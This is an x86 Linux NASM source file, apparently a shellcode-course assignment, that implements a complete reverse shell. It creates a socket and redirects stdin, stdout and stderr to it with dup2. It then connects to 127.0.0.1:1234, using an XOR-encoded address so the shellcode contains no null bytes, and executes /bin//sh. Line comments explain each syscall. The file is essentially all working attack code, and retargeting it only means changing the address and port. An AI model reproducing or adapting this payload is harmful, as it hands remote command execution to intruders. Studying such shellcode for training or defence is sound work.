
; SLAE Assignment 2
; reverseshell.nasm
; Nelis SLAE-1327

global _start

section .text

        _start:
;------------------------------------------------------------------------------------------------------------------------
; setup socket()
; #define __NR_socketcall 102 (/usr/include/i386-linux-gnu/asm/unistd_32.h) / 102 = al => 0x66
; #define SYS_SOCKET 1	/* sys_socket(2) */ (usr/include/linux/net.h) bl => 0x01
   	    xor eax, eax        ; Empty eax register
	    mov al, 0x66        ; Set system call socketcall
	    xor ebx, ebx        ; Empty ebx register
	    mov bl, 0x01        ; Call determines which socket function to invoke. In this case its function 1, sys_socket
; int socket(int domain, int type, int protocol);
;   domain = AF_INET (=IPV4) = 2
;   type =  SOCK_STREAM = 1
;   protocol = The only available protocol here = 0 => xor esi, esi AND push esi
	    xor esi, esi 	; Empty esi register
	    push esi	        ; Push socket args in reverse order to stack 
	    push 0x01       
	    push 0x02
	    mov ecx, esp        ; Save pointer

	    int 0x80            ; Make the syscall

	    xor edi, edi	; Empty any data in edi
	    xchg edi, eax       ; Save return value from eax (socket file descriptor) to edi. Will need later


;------------------------------------------------------------------------------------------------------------------------
;setup dup2()
; #define __NR_dup2 63 (/usr/include/i386-linux-gnu/asm/unistd_32.h)  / 63 = al => 0x3f
; copy file descriptors STDIN, STDOUT, STDERR via dup2
; int dup2(int oldfd, int newfd);
            mov ebx, edi
            xor ecx, ecx        ; Clear ecx register
            mov cl, 0x2         ; =2 (counter)
     dup2loop:
      	    mov al, 0x3f        ; Set systemcall dup2
            int 0x80		; Make the syscall
            dec ecx             ; ecx -1
            jns dup2loop	; jump not signed


;--------------------------------------------------------------------------------------------------------$
; setup connect()
; #define __NR_socketcall 102 (/usr/include/i386-linux-gnu/asm/unistd_32.h) / 102 = al => 0x66
; #define SYS_CONNECT 3/ * sys_connectbind(2)*/ (usr/include/linux/net.h) bl => 0x03
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);


	xor eax, eax
;	mov al, 0x66
	xor ebx, ebx,
;	mov bl, 0x3

; struct socket

	mov eax, 0xfeffff80 	; address 127.0.0.1 will cause bad chars (0x00). Take the opposite and xor to prevent that from happening
	xor eax, 0xffffffff
	push eax 		; push address 127.0.0.1 on the stack 
	push word 0xd204	; reverse byte port nr 1234
	push word 0x2 		; AF_INET = 2
	mov ecx, esp		; save pointer

; connect arguments:
	push 0x10           ; Push size of addr (16 bytes)
        push ecx            ; Push the pointer to sockaddr
        push edi            ; Push the file descriptor
        mov ecx, esp	    ; Save pointer
	mov dl, 0x10 	    ; size of struct addr
	xor eax, eax  	    ; Empty eax register
        mov al, 0x66	    ; Set systemcall socketcall 
        xor ebx, ebx	    ; Empty ebx register
        mov bl, 0x3	    ; Call determines which socket function to invoke. In this case its function 3, connect

        int 0x80            ; Make the syscall


;------------------------------------------------------------------------------------------------------------------------
;setup execve()
; #define __NR_execve 11 (/usr/include/i386-linux-gnu/asm/unistd_32.h)  / 11 = al => 0x0b
; int execve(const char *filename, char *const argv[],char *const envp[]);

	    xor eax, eax	; Empty eax register
	    mov al, 0x0b        ; Set systemcall execve
            xor ecx, ecx	; Empty ecx register
            push ecx            ; Push terminating null byte on the stack
            push 0x68732f2f	; Push filename on stack (hs//)
            push 0x6e69622f	; Push filename on stack (nib/)
            mov ebx, esp        ; Save pointer to encoded /bin//sh
            xor edx, edx	; Empty edx register (envp = NULL)
            int 0x80		; Make the syscall



